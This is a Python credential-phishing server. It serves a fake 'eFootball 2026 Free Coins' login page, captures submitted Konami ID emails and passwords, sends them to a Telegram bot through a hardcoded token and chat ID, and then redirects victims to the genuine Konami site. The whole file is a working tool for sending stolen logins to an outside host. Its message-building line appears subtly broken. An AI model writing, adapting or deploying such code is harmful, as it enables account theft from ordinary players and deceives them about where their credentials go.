import http.server
import urllib.parse
import json
import urllib.request
import os

TOKEN = "8861759753:AAEQPikaUCB-yti_nWZVCx9LFCfs6g4lWOU"
CHAT_ID = "5204157508"

HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eFootball 2026 - Free Coins Event</title>
    <style>
        body { background-color: #121212; color: #ffffff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background-color: #1e1e1e; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); width: 100%; max-width: 400px; text-align: center; }
        h2 { color: #00d2ff; margin-bottom: 20px; }
        input { width: 90%; padding: 12px; margin: 10px 0; background-color: #2c2c2c; border: 1px solid #444; color: white; border-radius: 5px; }
        button { width: 100%; padding: 12px; background-color: #00d2ff; border: none; color: #121212; font-weight: bold; border-radius: 5px; cursor: pointer; margin-top: 15px; }
        button:hover { background-color: #00a1cc; }
    </style>
</head>
<body>
    <div class="container">
        <h2>eFootball Free Coins</h2>
        <p>Login with your KONAMI ID to claim 10,000 Coins!</p>
        <form action="/" method="POST">
            <input type="text" name="email" placeholder="Konami ID / Email" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <button type="submit">Claim Coins</button>
        </form>
    </div>
</body>
</html>
"""

class PhishingHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(HTML_PAGE.encode('utf-8'))

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        parsed_data = urllib.parse.parse_qs(post_data)
        
        email = parsed_data.get('email', [''])[0]
        password = parsed_data.get('password', [''])[0]
        
        message = f"🚨 **New eFootball Login Captured!**\n\n👤 **Email/ID:** `{email}`\n🔑 **Password:** `{password}`"
        telegram_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload = json.dumps({"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}.encode('utf-8'))
        
        req = urllib.request.Request(telegram_url, data=payload, headers={'Content-Type': 'application/json'})
        try:
            urllib.request.urlopen(req)
        except Exception as e:
            print(f"Error: {e}")

        self.send_response(303)
        self.send_header('Location', 'https://www.konami.com/efootball/')
        self.end_headers()

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    server_address = ('0.0.0.0', port)
    httpd = http.server.HTTPServer(server_address, PhishingHandler)
    print(f"\n[+] Server running on port {port}...")
    httpd.serve_forever()
